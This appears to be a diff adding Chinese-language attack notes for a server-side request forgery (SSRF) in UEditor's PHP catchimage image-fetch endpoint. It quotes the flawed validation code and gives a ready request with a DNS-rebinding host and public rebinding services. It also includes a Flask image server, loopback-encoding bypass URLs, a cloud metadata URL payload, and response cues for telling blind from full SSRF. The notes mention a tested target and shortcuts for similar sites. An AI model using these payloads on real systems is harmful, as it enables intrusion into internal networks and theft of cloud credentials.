@@ -1,0 +1,62 @@
+=== 真实校验代码（官方 php/Uploader.class.php::saveRemote）===
+preg_match('/(^https*:\/\/[^:\/]+)/', $imgUrl, $matches);   // ① 停在第一个冒号前，端口被丢
+$ip = gethostbyname($host);                                  // ② 第 1 次 DNS
+if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) → "非法 IP"
+$heads = get_headers($imgUrl, 1);                            // ③ 第 2 次请求，默认跟随 302
+$fileType = strtolower(strrchr($imgUrl, '.'));               // ④ 取整串最后一个 '.' → query 可伪造后缀
+readfile($imgUrl, false, follow_location=false);             // ⑤ 第 3 次请求，显式不跟随 302
+
+=== 三个结构性结论 ===
+1. 一个 URL 解析 3 次 DNS、发 2 次 HTTP ⇒ DNS rebinding 正好落在这个窗口（第1次答公网过校验，第2/3次答 127.0.0.1）。
+2. 后缀由 strrchr 取整串最后一个点 ⇒ payload 必须以 `?x=1&logo.png` 结尾，否则先判 ERROR_HTTP_CONTENTTYPE 白打。
+3. readfile 显式 follow_location=false ⇒ 302 只能做盲 SSRF（端口 oracle / GET 型副作用），要回显必须靠 rebinding。
+
+=== 请求形态 ===
+POST /ueditor/php/controller.php?action=catchimage HTTP/1.1
+Host: TARGET
+Content-Type: application/x-www-form-urlencoded
+Content-Length: N
+
+source[]=http://<REBIND_HOST>/?a=1%26logo.png
+
+=== REBIND_HOST 三种 ===
+- 自建权威 DNS（最稳，需自有域名+VPS）：ns1 两条 A 记录轮换，TTL=0
+- 1u.ms：make-<公网IP>-127.0.0.1-rr.1u.ms
+- rbndr.us：<hex1>.<hex2>.rbndr.us ，如 01020304.7f000001.rbndr.us
+
+自建公网那端（任何路径都回图片，Python/Flask）：
+from flask import Flask, Response
+app = Flask(__name__)
+ICO = open('1.jpg','rb').read()
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def h(path):
+    return Response(ICO, mimetype="image/jpeg")
+app.run(host='0.0.0.0', port=80)
+
+=== 三级判据 ===
+"非法 IP"            → 第 1 次就解析成内网，调整绑定顺序（先公网后内网）
+"链接contentType不正确" → 第 2 次请求已打到内网 ⇒ 盲 SSRF 成立
+返回图片且内容=内网页面 → 全回显 SSRF
+
+=== 地址形态技巧（对"只查解析结果"的站点有效）===
+http://0/?logo.png            → 0.0.0.0 即本机
+http://127.1/?logo.png        → 127.0.0.1
+http://2130706433/?logo.png   → 十进制
+http://0177.0.0.1/?logo.png   → 八进制
+http://0x7f000001/?logo.png   → 十六进制
+http://127.0.0.1./?logo.png   → 尾点，绕字符串黑名单
+http://[::ffff:127.0.0.1]/?logo.png → IPv6 映射（正则 [^:\/]+ 在 : 处截断 → 大概率 INVALID_URL，优先级最低）
+
+=== 明确否定（别试）===
+http://user@127.0.0.1/ 、http://127.0.0.1:8080@evil/ 、http://127.0.0.1#@x/
+—— 正则停在第一个冒号前取到 http://user → filter_var 失败 → INVALID_URL。
+
+=== 对同族站的捷径 ===
+FILTER_FLAG_NO_PRIV_RANGE 只拦 10/8、172.16/12、192.168/16，
+**不拦 127.0.0.0/8 与 169.254.0.0/16**（后者属 FILTER_FLAG_NO_RES_RANGE）。
+⇒ 若目标只用了这一个 flag，`source[]=http://169.254.169.254/latest/meta-data/?a=1&logo.png` 与 127.0.0.1 都能过。
+（我们测的那台回"非法 IP"说明它另加了判断，这条对它已关，但对同族站是第一个该试的。）
+
+来源：https://www.cnblogs.com/iamstudy/articles/ueditor_ver_1_4_3_3_ssrf_1.html
+辅助：admintony.com、j1anfen.github.io 两篇同结论（rebinding 是唯一绕法，且不稳定）。
